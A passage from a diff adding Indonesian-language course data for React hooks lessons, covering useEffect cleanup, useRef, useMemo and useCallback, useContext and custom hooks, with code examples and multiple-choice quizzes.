+              "Tepat sebelum effect tersebut dijalankan ulang pada siklus berikutnya, dan saat komponen akan dicopot (unmounted) dari DOM layar.",
+              "Hanya saat komputer pengguna dimatikan.",
+              "Hanya ketika terjadi error runtime fatal.",
+              "Sebelum komponen pertama kali di-mount."
+            ],
+            "correctIndex": 0,
+            "explanation": "Cleanup function bertugas membersihkan resource efek sebelumnya sebelum effect baru berjalan atau saat komponen dibongkar (unmount)."
+          },
+          {
+            "id": "q-14-2-2",
+            "question": "Apa akibatnya jika Anda memasang window.addEventListener atau setInterval di dalam useEffect tanpa mengembalikan fungsi cleanup?",
+            "options": [
+              "Terjadi kebocoran memori (Memory Leak) karena event listener/timer lama akan terus hidup dan menumpuk di latar belakang setiap kali komponen berganti.",
+              "Browser akan langsung menutup aplikasi seketika.",
+              "Komponen otomatis berubah menjadi Class Component.",
+              "File CSS akan terhapus."
+            ],
+            "correctIndex": 0,
+            "explanation": "Tanpa cleanup, timer atau subscription liar akan terus aktif di memori Heap, menyebabkan memory leaks dan multi-fire bug."
+          },
+          {
+            "id": "q-14-2-3",
+            "question": "Mengapa pada mode development dengan React.StrictMode aktif, useEffect dengan dependency array kosong [] dieksekusi sebanyak dua kali?",
+            "options": [
+              "React sengaja melakukan simulasi unmount dan re-mount seketika untuk memverifikasi bahwa kode Anda memiliki fungsi cleanup yang bekerja dengan sempurna.",
+              "Karena browser Chrome mengalami bug rendering.",
+              "Karena kecepatan internet terlalu cepat.",
+              "Karena React ingin menduplikasi database."
+            ],
+            "correctIndex": 0,
+            "explanation": "Double-invocation di Strict Mode adalah mekanisme verifikasi ketahanan untuk memastikan effect aman terhadap cleanup dan re-mount."
+          }
+        ]
+      },
+      {
+        "id": "lesson-14-3",
+        "stageId": "stage-14",
+        "slug": "useref-dom-access-dan-mutable-references",
+        "title": "useRef: Akses Elemen DOM & Nilai Persisten Tanpa Re-render",
+        "titleEn": "useRef: DOM Access & Mutable References",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Memahami 2 kegunaan utama useRef: referensi langsung ke node DOM HTML (fokus input, scroll position) dan penyimpanan nilai mutable yang persisten tanpa memicu re-render.",
+        "prerequisites": [
+          "useeffect-lifecycle-dan-cleanup-functions"
+        ],
+        "learningObjectives": [
+          "Membedakan sifat useRef (perubahan nilai tidak memicu re-render) vs useState (memicu re-render).",
+          "Menghubungkan `ref={myRef}` ke elemen DOM untuk interaksi langsung (seperti `inputRef.current.focus()`).",
+          "Menyimpan nilai mutable latar belakang (seperti timer ID atau nilai props sebelumnya)."
+        ],
+        "whyMatters": "`useRef` memberikan 'jalan keluar darurat' untuk berinteraksi dengan API imperatif browser (seperti memutar video HTML5 atau mengontrol fokus input) tanpa merusak render cycle.",
+        "careerContext": "Komponen modal dialog aksesibel dan integrasi library chart eksternal (Chart.js, Canvas) selalu menggunakan `useRef`.",
+        "commonMistakes": [
+          "Mencoba membaca atau menulis `ref.current` di dalam badan utama JSX selama proses rendering (baca/tulis `ref.current` hanya boleh di event handler atau di dalam `useEffect`).",
+          "Menggunakan `useRef` saat ingin memperbarui tampilan visual di layar (gunakan `useState`)."
+        ],
+        "keyTerms": [
+          {
+            "term": "useRef",
+            "definition": "Hook yang mengembalikan objek referensi `{ current: initialValue }` yang persisten lintas render."
+          },
+          {
+            "term": "ref.current",
+            "definition": "Properti tempat menyimpan nilai mutable atau referensi ke elemen DOM fisik asli."
+          },
+          {
+            "term": "No Re-render",
+            "definition": "Sifat khas useRef di mana mengubah nilai `ref.current = newValue` tidak akan memicu komponen me-render ulang."
+          }
+        ],
+        "contentMd": "# useRef: Akses Elemen DOM & Nilai Persisten Tanpa Re-render\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari **`useRef`**: hook serbaguna React yang memiliki dua fungsi utama: **mengakses elemen DOM asli** (seperti fokus input otomatis) dan **menyimpan data mutable persisten tanpa memicu re-render**.\n\n## Mengapa Konsep Ini Penting?\nJika Anda ingin memfokuskan kursor ke dalam kotak pencarian saat modal dibuka, atau ingin menyimpan ID timer `setInterval` tanpa ingin komponen me-render ulang layar setiap kali angkanya berubah, Anda membutuhkan **`useRef`**.\n\n## 1. Perbandingan Kritis: `useState` vs `useRef`\n\n| Karakteristik | `useState` | `useRef` |\n| :--- | :--- | :--- |\n| **Menyimpan Data Antar Render?** | YA | YA |\n| **Memicu Re-render saat Berubah?** | **YA (Tampilan Diperbarui)** | **TIDAK (Senyap di Balik Layar)** |\n| **Akses Elemen DOM Asli?** | Tidak | **YA (`ref={myRef}`)** |\n| **Kasus Penggunaan Utama** | Data visual antarmuka | Fokus input, Timer ID, Pengukuran DOM |\n\n## 2. Penggunaan 1: Mengakses Elemen DOM Fisik\n\n```tsx\nimport { useRef, useEffect } from \"react\";\n\nexport function FormPencarianOtomatis() {\n  // 1. Buat ref bertipe HTMLInputElement:\n  const inputRef = useRef<HTMLInputElement>(null);\n\n  useEffect(() => {\n    // 2. Fokuskan kursor ke input secara otomatis saat halaman pertama dibuka:\n    inputRef.current?.focus();\n  }, []);\n\n  return (\n    <div>\n      {/* 3. Tautkan ref ke elemen JSX: */}\n      <input\n        ref={inputRef}\n        type=\"text\"\n        placeholder=\"Cari materi coding...\"\n        className=\"border p-2 rounded\"\n      />\n    </div>\n  );\n}\n```\n\n## 3. Penggunaan 2: Menyimpan Nilai Tanpa Memicu Re-render\nGunakan untuk menyimpan ID timer `setInterval` agar bisa dihentikan kapan saja:\n\n```tsx\nexport function Stopwatch() {\n  const [waktu, setWaktu] = useState(0);\n  \n  // Simpan timer ID di ref (bukan state, agar tidak memicu re-render ganda):\n  const timerRef = useRef<NodeJS.Timeout | null>(null);\n\n  function mulai() {\n    if (timerRef.current !== null) return;\n    timerRef.current = setInterval(() => {\n      setWaktu(prev => prev + 1);\n    }, 1000);\n  }\n\n  function berhenti() {\n    if (timerRef.current) {\n      clearInterval(timerRef.current);\n      timerRef.current = null;\n    }\n  }\n\n  return (\n    <div>\n      <h1>Detik: {waktu}</h1>\n      <button onClick={mulai}>Mulai</button>\n      <button onClick={berhenti}>Berhenti</button>\n    </div>\n  );\n}\n```\n\n## Kesalahan Umum Pemula\n- **Membaca/menulis `ref.current` di tengah proses render JSX**: Menulis `<div>{myRef.current = 10}</div>` adalah anti-pattern yang merusak kemurnian rendering React. Selalu mutasi `ref.current` di dalam **Event Handlers** atau **`useEffect`**.\n\n## Praktik Mandiri\n1. Buat tombol \"Scroll ke Bawah\".\n2. Gunakan `useRef` pada elemen footer dan panggil `footerRef.current?.scrollIntoView({ behavior: 'smooth' })` saat tombol diklik.\n\n## Ringkasan\n- **`useRef`** mengembalikan objek `{ current: nilai }` yang bertahan lintas render.\n- Mengubah nilai **`ref.current`** **TIDAK memicu komponen me-render ulang**.\n- Sangat ideal untuk **Akses DOM Langsung** dan **Penyimpanan ID Timer/Resource** internal.",
+        "quizzes": [
+          {
+            "id": "q-14-3-1",
+            "question": "Apa perbedaan perilaku paling mendasar antara memperbarui nilai useState (melalui setState) dan memperbarui nilai ref.current pada useRef?",
+            "options": [
+              "Memperbarui useState memicu komponen me-render ulang tampilan visualnya, sedangkan mengubah ref.current TIDAK memicu re-render komponen sama sekali.",
+              "useRef hanya bisa menyimpan angka sedangkan useState hanya string.",
+              "useRef menghapus state dari memori komputer.",
+              "Keduanya memicu re-render dengan cara yang persis sama."
+            ],
+            "correctIndex": 0,
+            "explanation": "useRef adalah kotak penampung nilai mutable yang persisten tanpa memicu siklus rekonsiliasi atau re-render pada UI."
+          },
+          {
+            "id": "q-14-3-2",
+            "question": "Kasus penggunaan manakah di bawah ini yang PALING TEPAT memanfaatkan hook useRef?",
+            "options": [
+              "Melakukan fokus otomatis pada input teks (inputRef.current?.focus()) atau mengontrol pemutaran video HTML5.",
+              "Menampilkan jumlah counter angka yang harus langsung berubah di layar saat diklik.",
+              "Menyimpan daftar produk e-commerce yang dirender di halaman.",
+              "Menghitung total harga belanjaan secara visual."
+            ],
+            "correctIndex": 0,
+            "explanation": "Interaksi langsung imperatif dengan DOM node seperti .focus(), .scrollIntoView(), atau canvas context adalah tujuan utama useRef."
+          },
+          {
+            "id": "q-14-3-3",
+            "question": "Di manakah tempat yang AMAN dan diizinkan untuk membaca atau memodifikasi nilai ref.current di dalam komponen React?",
+            "options": [
+              "Di dalam Event Handlers (seperti onClick, onSubmit) atau di dalam callback useEffect.",
+              "Langsung di tengah-tengah ekspresi JSX saat proses rendering.",
+              "Di dalam file CSS.",
+              "useRef tidak boleh diubah nilainya setelah diinisialisasi."
+            ],
+            "correctIndex": 0,
+            "explanation": "Aturan kemurnian render React melarang efek samping mutasi ref.current selama fase render JSX; mutasi hanya boleh di event handlers atau effects."
+          }
+        ]
+      },
+      {
+        "id": "lesson-14-4",
+        "stageId": "stage-14",
+        "slug": "usememo-dan-usecallback-performance",
+        "title": "useMemo vs useCallback: Optimasi Performa & Memoization",
+        "titleEn": "useMemo vs useCallback Memoization",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Memahami Referential Equality, memoization nilai komputasi berat dengan useMemo, stabilitas referensi fungsi dengan useCallback, dan bahaya Premature Optimization.",
+        "prerequisites": [
+          "useref-dom-access-dan-mutable-references"
+        ],
+        "learningObjectives": [
+          "Menjelaskan konsep Referential Equality pada fungsi dan objek di JavaScript.",
+          "Menerapkan useMemo untuk menyimpan hasil komputasi berat (filtering ribuan data).",
+          "Menerapkan useCallback untuk menjaga kestabilan referensi fungsi callback yang diteruskan ke komponen yang di-memo (`React.memo`).",
+          "Menganalisis bahaya Premature Optimization (menggunakan useMemo/useCallback di mana-mana yang justru memperlambat performa)."
+        ],
+        "whyMatters": "Mencegah re-render yang tidak perlu pada grafik/tabel data besar yang membutuhkan komputasi berat.",
+        "careerContext": "Senior Frontend Engineer tahu persis kapan harus menggunakan memoization dan kapan TIDAK menggunakannya.",
+        "commonMistakes": [
+          "Membungkus fungsi sederhana 1 baris dengan `useCallback` tanpa alasan jelas (overhead pembuatan dependensi lebih berat daripada fungsi aslinya).",
+          "Mengira `useCallback` menghentikan fungsi dari dieksekusi (ia hanya mengembalikan referensi fungsi yang sama)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Memoization",
+            "definition": "Teknik optimasi dengan menyimpan hasil komputasi mahal dan menggunakannya kembali saat input yang sama diberikan."
+          },
+          {
+            "term": "Referential Equality",
+            "definition": "Perbandingan apakah dua variabel menunjuk ke alamat memori yang persis sama (`===`)."
+          },
+          {
+            "term": "useMemo",
+            "definition": "Hook yang me-memoize HASIL NILAI dari sebuah fungsi komputasi."
+          },
+          {
+            "term": "useCallback",
+            "definition": "Hook yang me-memoize INSTANCE FUNGSI itu sendiri agar referensinya stabil."
+          }
+        ],
+        "contentMd": "# useMemo vs useCallback: Optimasi Performa & Memoization\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari **Optimasi Performa di React**: konsep **Referential Equality**, cara me-memoize kalkulasi berat dengan **`useMemo`**, menstabilkan referensi fungsi dengan **`useCallback`**, serta bahaya **Premature Optimization**.\n\n## Mengapa Konsep Ini Penting?\nDi React, setiap kali komponen me-render ulang, seluruh fungsi dan objek di dalamnya **dibuat ulang dari nol di memori**. Hal ini dapat memicu anak komponen me-render ulang tanpa henti meskipun datanya tidak berubah.\n\n## 1. Perbedaan Mendasar: `useMemo` vs `useCallback`\n\n```text\n┌───────────────────────────────────────────────────────────┐\n│ useMemo(() => hitungBerat(data), [data])                  │\n│ ──> Me-memoize HASIL NILAI (Return Value) dari komputasi  │\n├───────────────────────────────────────────────────────────┤\n│ useCallback(() => { handleHapus(id); }, [id])             │\n│ ──> Me-memoize INSTANCE FUNGSI (Function Reference)       │\n└───────────────────────────────────────────────────────────┘\n```\n\n## 2. Contoh Kasus 1: `useMemo` untuk Komputasi Berat\nBayangkan Anda memfilter daftar 10.000 produk. Tanpa `useMemo`, penyaringan berat ini akan dihitung ulang setiap kali ada ketikan huruf apapun di layar:\n\n```tsx\nimport { useMemo, useState } from \"react\";\n\nexport function GaleriProduk({ daftarProduk }: { daftarProduk: Produk[] }) {\n  const [kataKunci, setKataKunci] = useState(\"\");\n  const [temaGelap, setTemaGelap] = useState(false);\n\n  // KUNCI: Hanya hitung ulang penyaringan JIKA daftarProduk atau kataKunci BERUBAH!\n  // Jika temaGelap berubah, komputasi berat ini DILEWATI dan mengambil hasil cache!\n  const produkTersaring = useMemo(() => {\n    console.log(\"Menjalankan komputasi berat filtering 10.000 item...\");\n    return daftarProduk.filter(p => \n      p.nama.toLowerCase().includes(kataKunci.toLowerCase())\n    );\n  }, [daftarProduk, kataKunci]);\n\n  return (\n    <div>\n      <input value={kataKunci} onChange={e => setKataKunci(e.target.value)} />\n      <button onClick={() => setTemaGelap(prev => !prev)}>Toggle Tema</button>\n      <ProductListView items={produkTersaring} />\n    </div>\n  );\n}\n```\n\n## 3. Contoh Kasus 2: `useCallback` untuk Stabilitas Referensi Fungsi\nJika Anda meneruskan fungsi ke komponen anak yang dibungkus `React.memo`:\n\n```tsx\nimport React, { useCallback, useState } from \"react\";\n\n// Komponen Anak yang Di-memo (Hanya render ulang jika props berubah):\nconst TombolHapusMemo = React.memo(({ onHapus }: { onHapus: () => void }) => {\n  console.log(\"Render TombolHapus\");\n  return <button onClick={onHapus}>Hapus</button>;\n});\n\nexport function DaftarItem() {\n  const [count, setCount] = useState(0);\n\n  // useCallback menjaga agar alamat memori fungsi handleHapus TIDAK BERUBAH antar render:\n  const handleHapus = useCallback(() => {\n    console.log(\"Menghapus item...\");\n  }, []); // Referensi fungsi stabil selamanya\n\n  return (\n    <div>\n      <button onClick={() => setCount(c => c + 1)}>Tambah: {count}</button>\n      {/* TombolHapus TIDAK AKAN me-render ulang saat count bertambah! */}\n      <TombolHapusMemo onHapus={handleHapus} />\n    </div>\n  );\n}\n```\n\n## 4. Bahaya Premature Optimization (Jangan Gunakan di Mana-Mana!)\nMemoization **bukanlah tanpa biaya**. React harus menyimpan array dependensi di memori dan melakukan perbandingan kesetaraan di setiap render.\n> **Aturan Praktis**: Jangan gunakan `useMemo` / `useCallback` untuk operasi ringan (seperti menjumlahkan 5 angka atau fungsi klik tombol biasa). Gunakan HANYA saat ada bukti nyata terjadi penurunan performa atau komponen anak dibungkus `React.memo`.\n\n## Kesalahan Umum Pemula\n- **Lupa dependensi pada useMemo/useCallback**: Mengakibatkan fungsi mengunci (*stale closure*) nilai lama variabel yang sudah usang.\n\n## Praktik Mandiri\n1. Buat perhitungan faktorial angka besar dengan `useMemo`.\n2. Amati bagaimana UI tetap responsif saat state lain diperbarui.\n\n## Ringkasan\n- **`useMemo`** me-memoize **Hasil Nilai** komputasi berat.\n- **`useCallback`** me-memoize **Referensi Fungsi** agar stabil untuk anak komponen yang di-memo.\n- Jangan gunakan berlebihan (*Premature Optimization*) untuk operasi biasa.",
+        "quizzes": [
+          {
+            "id": "q-14-4-1",
+            "question": "Apa perbedaan paling mendasar antara kegunaan hook useMemo dan useCallback di React?",
+            "options": [
+              "useMemo me-memoize HASIL NILAI kembalian dari suatu komputasi, sedangkan useCallback me-memoize INSTANCE FUNGSI itu sendiri agar memiliki referensi memori yang stabil.",
+              "useMemo hanya untuk database dan useCallback untuk CSS.",
+              "useCallback menghapus fungsi dari memori.",
+              "Keduanya adalah sinonim yang persis sama."
+            ],
+            "correctIndex": 0,
+            "explanation": "useMemo mengeksekusi fungsi dan mengingat nilai return-nya, sementara useCallback mengembalikan referensi fungsi yang sama tanpa menjalankannya."
+          },
+          {
+            "id": "q-14-4-2",
+            "question": "Kapan penggunaan hook useMemo benar-benar memberikan manfaat performa yang nyata?",
+            "options": [
+              "Ketika melakukan operasi komputasi berat (seperti memfilter/mentransformasikan ribuan data array) yang tidak ingin dihitung ulang saat state yang tidak terkait berubah.",
+              "Pada setiap operasi penambahan 1 + 1 sederhana.",
+              "Pada semua baris teks di dalam JSX.",
+              "Hanya saat koneksi internet terputus."
+            ],
+            "correctIndex": 0,
+            "explanation": "useMemo bernilai tinggi untuk kalkulasi komputasi mahal, menghindari komputasi CPU berulang pada re-render yang tidak relevan."
+          },
+          {
+            "id": "q-14-4-3",
+            "question": "Mengapa membungkus setiap fungsi biasa dengan useCallback secara membabi-buta (Premature Optimization) justru dapat merugikan performa aplikasi?",
+            "options": [
+              "Karena React harus mengalokasikan memori tambahan untuk menyimpan array dependensi dan membandingkan referensinya di setiap siklus render, yang overhead-nya bisa lebih mahal daripada membuat fungsi biasa.",
+              "Karena useCallback membatasi jumlah klik pengguna.",
+              "Karena useCallback dilarang di perangkat mobile.",
+              "Karena fungsi akan otomatis terhapus."
+            ],
+            "correctIndex": 0,
+            "explanation": "Overhead alokasi array dependensi dan eksekusi komparasi membuat memoization fungsi sederhana justru lebih boros sumber daya."
+          }
+        ]
+      },
+      {
+        "id": "lesson-14-5",
+        "stageId": "stage-14",
+        "slug": "usecontext-dan-context-api",
+        "title": "useContext & Context API: Mengatasi Prop Drilling",
+        "titleEn": "useContext & The Context API",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Memecahkan masalah Prop Drilling (mengirim props berjenjang), createContext, Context.Provider, useContext hook, dan arsitektur Custom Provider pattern.",
+        "prerequisites": [
+          "usememo-dan-usecallback-performance"
+        ],
+        "learningObjectives": [
+          "Mendiagnosis masalah arsitektur Prop Drilling pada pohon komponen yang dalam.",
+          "Membangun global-like state menggunakan createContext, Context.Provider, dan useContext.",
+          "Menerapkan pola arsitektur Custom Provider & Custom Hook (`useTheme`, `useAuth`).",
+          "Menganalisis keterbatasan Context API (seluruh komponen konsumen akan re-render saat nilai context berubah)."
+        ],
+        "whyMatters": "Menyediakan data global seperti Tema Gelap/Terang, Bahasa Aplikasi (i18n), dan Status Login Pengguna ke seluruh komponen tanpa harus mengoper props secara manual melewati 10 tingkat komponen.",
+        "careerContext": "Memahami Context API adalah jembatan penting sebelum melangkah ke state management yang lebih canggih seperti Zustand.",
+        "commonMistakes": [
+          "Menggunakan Context API untuk data yang frekuensi pembaruannya sangat tinggi (seperti koordinat mouse atau input teks real-time) yang memicu re-render massal.",
+          "Lupa membungkus pohon komponen dengan `<MyContext.Provider>`."
+        ],
+        "keyTerms": [
+          {
+            "term": "Prop Drilling",
+            "definition": "Proses melelahkan mengoper props melewati banyak komponen perantara yang sebenarnya tidak membutuhkan data tersebut."
+          },
+          {
+            "term": "createContext",
+            "definition": "Fungsi React untuk menciptakan objek Context baru."
+          },
+          {
+            "term": "Context Provider",
+            "definition": "Komponen pembungkus yang mendistribusikan data context ke seluruh keturunan di bawahnya."
+          },
+          {
+            "term": "useContext",
+            "definition": "Hook untuk membaca dan berlangganan nilai context dari Provider terdekat."
+          }
+        ],
+        "contentMd": "# useContext & Context API: Mengatasi Prop Drilling\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari **React Context API** dan **`useContext`**: bagaimana mengatasi masalah **Prop Drilling** (mengoper props melewati banyak tingkatan), membuat **Custom Provider Pattern**, serta memahami batasan performa Context.\n\n## Mengapa Konsep Ini Penting?\nBayangkan Anda memiliki data pengguna yang sedang login di komponen root `App`. Komponen tombol logout berada di dalam `Navbar $\\rightarrow$ NavMenu $\\rightarrow$ UserDropdown $\\rightarrow$ LogoutButton`. Apakah Anda harus mengoper props `user` melewati 4 komponen perantara tersebut? Masalah ini disebut **Prop Drilling**, dan Context API adalah solusinya!\n\n## 1. Arsitektur Context API (Pola Custom Provider)\n\n```tsx\n// File: src/context/ThemeContext.tsx\nimport React, { createContext, useContext, useState } from \"react\";\n\ntype Tema = \"light\" | \"dark\";\n\ninterface ThemeContextType {\n  tema: Tema;\n  toggleTema: () => void;\n}\n\n// 1. Buat Context dengan nilai awal undefined:\nconst ThemeContext = createContext<ThemeContextType | undefined>(undefined);\n\n// 2. Buat Custom Provider Pembungkus:\nexport function ThemeProvider({ children }: { children: React.ReactNode }) {\n  const [tema, setTema] = useState<Tema>(\"light\");\n\n  const toggleTema = () => {\n    setTema(prev => (prev === \"light\" ? \"dark\" : \"light\"));\n  };\n\n  return (\n    <ThemeContext.Provider value={{ tema, toggleTema }}>\n      {children}\n    </ThemeContext.Provider>\n  );\n}\n\n// 3. Buat Custom Hook yang Aman & Ergonomis:\nexport function useTheme() {\n  const context = useContext(ThemeContext);\n  if (!context) {\n    throw new Error(\"useTheme harus digunakan di dalam <ThemeProvider>!\");\n  }\n  return context;\n}\n```\n\n## 2. Membungkus Aplikasi & Mengonsumsi Data di Mana Saja\n\n### Langkah 1: Pasang Provider di Root Aplikasi\n```tsx\n// File: src/App.tsx\nimport { ThemeProvider } from \"./context/ThemeContext\";\nimport { HalamanUtama } from \"./components/HalamanUtama\";\n\nexport function App() {\n  return (\n    <ThemeProvider>\n      <HalamanUtama />\n    </ThemeProvider>\n  );\n}\n```\n\n### Langkah 2: Konsumsi Langsung di Komponen Terdalam Manapun!\n```tsx\n// File: src/components/TombolTema.tsx\nimport { useTheme } from \"../context/ThemeContext\";\n\nexport function TombolTema() {\n  // Akses data secara instan tanpa perlu props melewati parent!\n  const { tema, toggleTema } = useTheme();\n\n  return (\n    <button onClick={toggleTema} className=\"btn\">\n      Tema Saat Ini: {tema.toUpperCase()}\n    </button>\n  );\n}\n```\n\n## 3. Kapan Menggunakan Context vs Kapan Menghindarinya?\n- **Sangat Bagus Digunakan Untuk**: Data global dengan frekuensi pembaruan rendah (Tema Gelap/Terang, Bahasa Terpilih/i18n, Sesi Otentikasi User).\n- **HINDARI Penggunaan Untuk**: Data dengan frekuensi pembaruan sangat tinggi (posisi koordinat kursor mouse, data input ketikan teks formulir, animasi timer) — karena **setiap kali nilai Provider berubah, SELURUH komponen yang memanggil `useContext` akan me-render ulang secara bersamaan**.\n\n## Kesalahan Umum Pemula\n- **Membuat 1 Context Raksasa untuk Seluruh Data**: Menyatukan auth, tema, keranjang belanja, dan formulir ke dalam satu context raksasa yang memicu re-render massal ke seluruh aplikasi.\n\n## Praktik Mandiri\n1. Buat `AuthContext` dengan state `user: { name: string } | null`, fungsi `login(name)`, dan `logout()`.\n2. Uji komponen login yang dapat mengubah nama user dan terbaca langsung di komponen Navbar terpisah.\n\n## Ringkasan\n- **Prop Drilling** adalah pengoperan props berjenjang yang melelahkan.\n- **Context API** mendistribusikan data global ke seluruh pohon komponen.\n- Selalu buat **Custom Hook (`useAuth`, `useTheme`)** untuk konsumsi context yang aman dan type-safe.\n- Gunakan Context untuk data berfrekuensi pembaruan rendah (tema, otentikasi).",
+        "quizzes": [
+          {
+            "id": "q-14-5-1",
+            "question": "Masalah arsitektur apakah di React yang secara efektif diatasi dengan kehadiran Context API dan useContext?",
+            "options": [
+              "Prop Drilling: keharusan melelahkan mengoper props melewati banyak lapisan komponen perantara yang sebenarnya tidak membutuhkan data tersebut.",
+              "Koneksi database yang lambat.",
+              "Ukuran gambar yang terlalu besar.",
+              "Kekurangan memori RAM pada kartu grafis komputer."
+            ],
+            "correctIndex": 0,
+            "explanation": "Context API menyediakan saluran distribusi data broadcast langsung dari Provider ke komponen konsumen manapun tanpa prop drilling."
+          },
+          {
+            "id": "q-14-5-2",
+            "question": "Mengapa Context API sebaiknya TIDAK digunakan untuk mengelola data dengan frekuensi pembaruan yang sangat cepat (seperti posisi kursor mouse atau input teks real-time)?",
+            "options": [
+              "Karena setiap kali nilai pada Provider berubah, seluruh komponen konsumen yang memanggil useContext terkait akan me-render ulang secara serentak sehingga dapat memicu penurunan performa.",
+              "Karena Context API membatasi update maksimal 1 kali per hari.",
+              "Karena Context API menghapus state keyboard.",
+              "Karena TypeScript melarang animasi pada Context."
+            ],
+            "correctIndex": 0,
+            "explanation": "Ketiadaan mekanisme selektor bawaan pada Context API membuat semua komponen subscriber re-render serentak saat value provider berganti."
+          },
+          {
+            "id": "q-14-5-3",
+            "question": "Apa keuntungan membuat Custom Hook (contoh: function useTheme() { const ctx = useContext(ThemeContext); ... }) daripada memanggil useContext langsung di komponen?",
+            "options": [
+              "Memudahkan pengecekan keamanan jika hook dipanggil di luar Provider (melempar error deskriptif yang jelas) dan menyediakan enkapsulasi type-safe yang bersih.",
+              "Mengurangi ukuran file HTML menjadi 0 KB.",
+              "Menghilangkan kebutuhan file TypeScript.",
+              "Membuat tema berubah warna secara acak."
+            ],
+            "correctIndex": 0,
+            "explanation": "Custom hook membungkus pengecekan null/undefined guard dan memastikan developer mendapatkan error yang jelas jika lupa memasang Provider pembungkus."
+          }
+        ]
+      },
+      {
+        "id": "lesson-14-6",
+        "stageId": "stage-14",
+        "slug": "custom-hooks-reusable-logic-extraction",
+        "title": "Custom Hooks: Ekstraksi Logika State Reusable",
+        "titleEn": "Custom Hooks & Logic Extraction",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Mengekstrak logika stateful yang berulang menjadi Custom Hooks (konvensi `use*`), contoh nyata: useDebounce, useLocalStorage, dan useMediaQuery.",
+        "prerequisites": [
+          "usecontext-dan-context-api"
+        ],
+        "learningObjectives": [
+          "Mengekstrak logika state dan side-effects yang berulang menjadi Custom Hook mandiri.",
+          "Menerapkan konvensi penamaan resmi `useNamaHook` yang divalidasi oleh linter React.",
+          "Membangun Custom Hooks populer tingkat industri: `useLocalStorage`, `useDebounce`, dan `useWindowSize`.",
+          "Menjelaskan bahwa setiap pemanggilan Custom Hook memiliki instance state terisolasi independen miliknya sendiri."
+        ],
+        "whyMatters": "Custom Hooks adalah mekanisme terbersih di React untuk berbagi logika bisnis (*stateful logic*) antar komponen tanpa menduplikasi baris kode.",
+        "careerContext": "Membangun custom hooks modular adalah keterampilan inti yang diuji dalam live coding wawancara React.",
+        "commonMistakes": [
+          "Mengira dua komponen yang memanggil custom hook yang sama saling berbagi data state (setiap pemanggilan hook menciptakan memori state independen terpisah).",
+          "Lupa mengawali nama fungsi dengan prefix `use` (linter React tidak akan memeriksa Rules of Hooks jika tanpa prefix `use`)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Custom Hook",
+            "definition": "Fungsi JavaScript yang diawali dengan kata `use` yang dapat memanggil hooks bawaan React lainnya untuk mengekstrak logika stateful."
+          },
+          {
+            "term": "Stateful Logic",
+            "definition": "Logika komputasi yang melibatkan state, lifecycle effects, atau subscriptions."
+          },
+          {
+            "term": "useDebounce",
+            "definition": "Custom hook populer untuk menunda eksekusi pencarian hingga pengguna berhenti mengetik selama durasi waktu tertentu."
+          }
+        ],
+        "contentMd": "# Custom Hooks: Ekstraksi Logika State Reusable\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari seni membuat **Custom Hooks**: bagaimana mengekstrak logika stateful yang berulang menjadi fungsi mandiri berawalan **`use*`**, serta membangun custom hook standar industri seperti **`useLocalStorage`** dan **`useDebounce`**.\n\n## Mengapa Konsep Ini Penting?\nJika Anda memiliki 5 komponen berbeda yang semuanya membutuhkan logika \"Simpan data ke LocalStorage\", apakah Anda harus menyalin 20 baris kode `useState`, `useEffect`, dan `JSON.parse` di kelima komponen tersebut? Dengan Custom Hooks, Anda membungkusnya menjadi satu baris: `const [data, setData] = useLocalStorage('key', initial)`.\n\n## 1. Aturan Pembuatan Custom Hook\n1. **Wajib Diawali Kata `use`**: Contoh: `useDebounce`, `useAuth`, `useOnlineStatus`. Ini memberitahu compiler React untuk memeriksa kepatuhan *Rules of Hooks*.\n2. **Dapat Memanggil Hook Lain**: Custom hook bebas memanggil `useState`, `useEffect`, `useRef`, dll.\n3. **State Bersifat Terisolasi**: Setiap kali sebuah komponen memanggil custom hook, komponen tersebut mendapatkan **salinan memori state independen miliknya sendiri**.\n\n## 2. Contoh Nyata 1: Custom Hook `useLocalStorage`\n\n```tsx\n// File: src/hooks/useLocalStorage.ts\nimport { useState, useEffect } from \"react\";\n\nexport function useLocalStorage<T>(kunci: string, nilaiAwal: T): [T, (val: T | ((prev: T) => T)) => void] {\n  // 1. Inisialisasi State dari LocalStorage:\n  const [dataTersimpan, setDataTersimpan] = useState<T>(() => {\n    try {\n      const item = localStorage.getItem(kunci);\n      return item ? JSON.parse(item) : nilaiAwal;\n    } catch (error) {\n      console.error(\"Gagal membaca LocalStorage:\", error);\n      return nilaiAwal;\n    }\n  });\n\n  // 2. Sinkronkan ke LocalStorage saat state berubah:\n  useEffect(() => {\n    try {\n      localStorage.setItem(kunci, JSON.stringify(dataTersimpan));\n    } catch (error) {\n      console.error(\"Gagal menyimpan ke LocalStorage:\", error);\n    }\n  }, [kunci, dataTersimpan]);\n\n  return [dataTersimpan, setDataTersimpan];\n}\n```\n\n### Cara Penggunaan di Komponen:\n```tsx\nexport function PengaturanProfil() {\n  // Sangat bersih layaknya useState biasa, namun otomatis tersimpan permanen di browser!\n  const [nama, setNama] = useLocalStorage<string>(\"user_name\", \"Acelino\");\n\n  return <input value={nama} onChange={e => setNama(e.target.value)} />;\n}\n```\n\n## 3. Contoh Nyata 2: Custom Hook `useDebounce` (Optimasi Search Bar)\nMencegah request API ditembakkan di setiap ketikan huruf:\n\n```tsx\n// File: src/hooks/useDebounce.ts\nimport { useState, useEffect } from \"react\";\n\nexport function useDebounce<T>(nilai: T, jedaMs: number = 500): T {\n  const [nilaiDebounce, setNilaiDebounce] = useState<T>(nilai);\n\n  useEffect(() => {\n    const handler = setTimeout(() => {\n      setNilaiDebounce(nilai);\n    }, jedaMs);\n\n    return () => clearTimeout(handler); // Bersihkan timer jika user mengetik lagi\n  }, [nilai, jedaMs]);\n\n  return nilaiDebounce;\n}\n```\n\n## Kesalahan Umum Pemula\n- **Mengira Custom Hook berbagi state global**: Memanggil `useLocalStorage` di Komponen A dan Komponen B membuat dua state terpisah. Jika butuh berbagi state global secara real-time, gunakan Context API atau Zustand.\n\n## Praktik 